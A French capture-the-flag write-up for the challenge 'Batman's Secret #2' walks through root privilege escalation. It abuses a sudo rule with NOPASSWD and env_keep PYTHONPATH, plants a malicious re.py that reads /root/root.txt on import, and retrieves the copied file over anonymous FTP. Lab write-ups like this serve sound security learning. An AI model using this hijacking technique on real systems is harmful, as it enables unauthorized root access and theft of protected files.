# Batman's Secret #2

## Contexte
- **Nom du challenge** : Batman's Secret #2
- **Catégorie** : Injection
- **Difficulté** : Easy
- **Objectif** : lire le fichier `/root/root.txt`, ce qui nécessite les droits **root**.
- **Point de départ** : exécution de commandes en tant qu'utilisateur `bruce`
  (via l'injection de commande obtenue dans le challenge *Batman's Secret*).

---

## 1. Découverte du privilège sudo

Exécuté via l'injection de commande (en tant que `bruce`) :

```bash
sudo -l
```

```
User bruce may run the following commands on <host>:
    (root) NOPASSWD: /usr/bin/python3 /opt/scanner/gotham_scanner.py
Defaults    env_keep+=PYTHONPATH
```

Deux éléments intéressants :
- **`NOPASSWD`** : `bruce` peut lancer `python3 /opt/scanner/gotham_scanner.py` en root sans
  mot de passe.
- **`env_keep+=PYTHONPATH`** : `sudo` **conserve la variable `PYTHONPATH`** au lieu de la
  nettoyer — c'est la porte d'entrée du PYTHONPATH hijacking.

---

## 2. Analyse du script cible

Le script `/opt/scanner/gotham_scanner.py` importe deux modules :

```python
import time
import re
...
```

- **`time`** est un module **natif compilé** (built-in) → **impossible à détourner** via
  `PYTHONPATH`.
- **`re`** est un module **Python pur** (fichier `.py`) → **détournable** : si Python trouve
  un autre `re.py` avant la bibliothèque standard, c'est notre code qui s'exécute à l'`import`.

---

## 3. Exploitation — PYTHONPATH hijacking

### 3.1 Création du faux module

On repère un dossier **world-writable** : `/opt/hotline/logs/`. Via l'injection de commande,
on y écrit un faux `re.py` malveillant, contenant une fonction `search()` (appelée par le
scanner) qui copie le flag dès l'import :

```python
import os
os.system("cat /root/root.txt > /opt/hotline/logs/pwn.txt")

def search(*args, **kwargs):
    return None
```

> Le fichier de sortie `pwn.txt` est placé dans un dossier accessible (ici aussi
> `/opt/hotline/logs/`, world-readable) afin de pouvoir le récupérer ensuite.

### 3.2 Lancement via sudo

```bash
sudo PYTHONPATH=/opt/hotline/logs /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Grâce à `env_keep+=PYTHONPATH`, la variable survit à `sudo`. Python charge donc
`/opt/hotline/logs/re.py` **avant** la lib standard → le payload s'exécute avec les
privilèges **root** et copie `/root/root.txt` dans `pwn.txt`.

---

## 4. Récupération finale du flag

Le fichier `pwn.txt` (contenant le flag) est lisible via le **FTP anonyme** :

```bash
ftp <IP>
# user : anonymous
# password : (vide)
get pwn.txt
```

→ **flag `root.txt` obtenu**.

---


## Outils utilisés
- `sudo` — exécution du script en root
- `python3` — chargement du module détourné
- `ftp` — récupération du flag copié (`pwn.txt`)
- injection de commande — écriture du faux module et lancement du payload

## Techniques utilisées
- **Reconnaissance des privilèges** (`sudo -l`)
- Exploitation d'une **configuration sudo dangereuse** (`NOPASSWD` + `env_keep=PYTHONPATH`)
- **PYTHONPATH hijacking** (détournement d'un module Python pur `re`, `time` built-in exclu)
- Exploitation d'un **dossier world-writable** (`/opt/hotline/logs/`)
- **Exfiltration** du flag via un fichier accessible + FTP anonyme
